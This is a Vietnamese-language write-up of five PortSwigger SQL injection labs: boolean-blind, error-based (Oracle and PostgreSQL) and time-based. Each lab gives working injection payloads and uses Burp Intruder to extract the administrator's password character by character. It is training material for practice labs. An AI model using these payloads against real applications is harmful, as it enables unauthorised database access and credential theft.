![image](https://github.com/itravnn/kcsc_train/assets/127108265/36e5b9ef-9d38-46f9-8171-c5e15a302b47)

## 1. Lab: Blind SQL injection with conditional responses
Đề cho sẵn _The database contains a different table called **users**, with columns called **username** and **password**. You need to exploit the blind SQL injection vulnerability to find out the password of the **administrator** user_

để kiểm tra xem có tồn tại bảng **users** hay không 
```
' AND (SELECT 'a' FROM users LIMIT 1)='a
```

kết quả trả về có xuất hiện _welcome back_, chứng tỏ bảng có tồn tại

tương tự, kiểm tra xem trong bảng có người dùng tên _administrator_

```
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

tiếp theo , ta cần xác định độ dài của passwd với hàm **LENGTH()**

```
' AND (SELECT 'a' FROM users WHERE username='administrator' and length(password)>1)='a
```

kết quả trả về đúng tức là độ dài passwd lớn hơn 1. Như vậy ta tiếp tục thử thay số 1 bằng các giá trị khác sẽ xác định được độ dài passwd là 20

sau khi đó ta sẽ dùng hàm **SUBSTRING()** ĐỂ lấy 1 giá trị từ passwd và test nó với các giá trị khác nhau

```
' AND (SELECT substring(password,1,1) FROM users WHERE username='administrator')='a
```

ở đây, hàm substring() sẽ lấy 1 kí tự tại vị trí đầu tiên của passwd và so sánh với giá trị 'a'. Như vậy để kiểm thử tất cả các kí tự tại tất cả vị trí ta sẽ sử dụng **Burp Intruder**. Đánh dấu kí tự cần được thay đổi giá trị

![image](https://github.com/itravnn/kcsc_train/assets/127108265/5d57e656-5b7f-4e62-92a3-e840f6bdb9e3)

start attack sẽ thu được kết quả, sau đó chỉ cần sắp xếp lại vị trí thứ tự ta sẽ tìm ra được passwd

![image](https://github.com/itravnn/kcsc_train/assets/127108265/a036fb72-9d11-43ee-b7c5-01df2f8c67a1)

## 2. Lab: Blind SQL injection with conditional errors
_This lab uses an Oracle database_

![image](https://github.com/itravnn/kcsc_train/assets/127108265/003facb1-0248-452b-b59d-329295136269)

trước tiên là tìm độ dài của passwd

```
'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')||'a--
```

lúc này nếu biểu thức **case** đúng, tức là độ dài passwd lớn hơn 1 thì biểu thức sẽ trở thành 1/0, điều này gây ra lỗi trả về. 

như vậy ta dùng burp intruder `LENGTH(password)>$1$`  để tìm ra được độ dài passwd là 20

tương tự như lab trước, vẫn dùng hàm substring() để test các kí tự của passwd

```
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')||'a--
```

cũng dùng burp intruder để test các giá trị `SUBSTR(password,$1$,1)='$a$'` để ra được passwd

## 3. Lab: Visible error-based SQL injection

bài này ta sẽ dùng hàm **CASE()**, hàm này cho phép chuyển dữ liệu loại này sang dữ liệu loại khác. nếu kiểu dữ kiệu không tương thích sẽ trả về lỗi cụ thể.

trước tiên thử 
```
' AND CAST((SELECT 1) AS int)--
```
thông báo lỗi trả về

![image](https://github.com/itravnn/kcsc_train/assets/127108265/50bfc2dc-1d08-4aab-b57a-eaf71b7afba8)

lúc này báo lỗi về `AND` điều kiện phải là biểu thức boolean

thêm `=` 

```
' AND 1=CAST((SELECT 1) AS int)--
```

lúc này lỗi không còn nữa

tiếp tục, để tìm tên user có trong bảng 

```
' AND 1=CAST((SELECT username FROM users) AS int)--
```

![image](https://github.com/itravnn/kcsc_train/assets/127108265/0225c823-8b9e-44ef-8b5c-922e9bb386c4)

có vẻ như truy vấn bị mất ký tự do giới hạn ký tự, nên ta xóa giá trị của `TrackingId` để không bị mất ký tự.

![image](https://github.com/itravnn/kcsc_train/assets/127108265/9fd6ff38-be27-450b-bb76-62b8855ca372)

lỗi trả về lúc này là do trả về nhiều hàng, ta cần giới hạn số hàng trả về

```
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

![image](https://github.com/itravnn/kcsc_train/assets/127108265/689149dd-a703-440a-a445-b4c89b2e8d99)

tìm được hàng đầu là của user 'administrator' 

như vậy cần tìm passwd nữa là xong

```
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

![image](https://github.com/itravnn/kcsc_train/assets/127108265/f3df6162-e59b-4d6d-b212-4d52e8afe67c)

## 4. Lab: Blind SQL injection with time delays

![image](https://github.com/itravnn/kcsc_train/assets/127108265/a45a2c6e-0f0f-4a17-969c-3bc910b1f068)

ở bài này ta chỉ cần thay đổi giá trị `TrackingId`, với kiểu cơ sở dữ liệu thích hợp

```
TrackingId=x'||pg_sleep(10)--
```
gửi yêu cầu và phản hồi trả lại mất 10s là thành công

## 5. Lab: Blind SQL injection with time delays and information retrieval

trước tiên thử xem bảng có tồn tại tên user 'administrator' hay không

```
'%3bSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

phản hồi trả lại sau 10s, chứng tỏ điều kiện đúng

tiếp theo, ta sẽ tìm độ dài của passwd với hàm length()

```
'%3bSELECT+CASE+WHEN+(username='administrator'+and+length(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

dựa vào thời gian trả lại phản hồi mà ta sẽ xác định được độ dài của passwd bằng cách thay đổi giá trị `length(password)>$1$`, như vậy xác định được độ dài là 20

dùng hàm substring() để tìm ra passwd

```
'%3bSELECT+CASE+WHEN+(username='administrator'+and+substring(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

sử dụng burp intruder 2 giá trị `substring(password,$1$,1)='$a$'` , rồi start

để tìm được thời gian phản hồi nhận lại, ta nhấn như dưới,sau đó sẽ tìm được passwd

![image](https://github.com/itravnn/kcsc_train/assets/127108265/3235e8e6-dfcd-4cef-a52a-a9f1e80bda88)

done!!!!!


















